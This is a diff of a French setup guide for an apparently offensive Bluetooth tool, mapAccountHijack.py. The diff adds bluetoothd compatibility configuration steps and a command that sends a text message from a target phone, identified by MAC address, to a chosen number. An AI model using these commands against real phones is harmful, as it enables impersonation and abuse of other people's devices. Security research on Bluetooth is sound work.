@@ -187,7 +187,14 @@ Exécution du fichier d'installation :
 ```
 sudo ./install.sh
 ```
-[INSTRUCTIONS A VOIR SUR LE GITHUB]
+Modifier le fichier suivant : 
+```
+nano /usr/lib/systemd/system/bluetooth.service
+```
+La ligne à modifier est la suivante : 
+```
+ExecStart=/usr/libexec/bluetooth/bluetoothd --compat
+```
 
 Redémarrage des services :
 
@@ -219,8 +226,12 @@ Pour tester vous pouvez exécuter la commande suivante :
 ```
 python3.10 mapAccountHijack.py --help
 ```
+Pour envoyer un message à un numéro depuis le téléphone : 
+```
+python3.10 mapAccountHijack.py --address <adresse_MAC> --dest-dir ./out --phone-number <numero_de_telephone_cible>
+```
 
-### Installation du github (Python 3)
+### Installation de l'outil (Python 3)
 
 Téléchargement du github utilisé :
 ```
@@ -246,9 +257,16 @@ Exécution du fichier d'installation :
 ```
 sudo ./install.sh
 ```
-[INSTRUCTIONS A VOIR SUR LE GITHUB]
+Modifier le fichier suivant : 
+```
+nano /usr/lib/systemd/system/bluetooth.service
+```
+La ligne à modifier est la suivante : 
+```
+ExecStart=/usr/libexec/bluetooth/bluetoothd --compat
+```
 
-Redémarrage des services :
+Puis redémarrer les services :
 
 ```
 sudo service bluetooth stop
@@ -277,6 +295,10 @@ Vous avez terminé !
 Pour tester vous pouvez exécuter la commande suivante : 
 ```
 python3 mapAccountHijack.py --help
+```
+Pour envoyer un message à un numéro depuis le téléphone : 
+```
+python3 mapAccountHijack.py --address <adresse_MAC> --dest-dir ./out --phone-number <numero_de_telephone_cible>
 ```
 
 
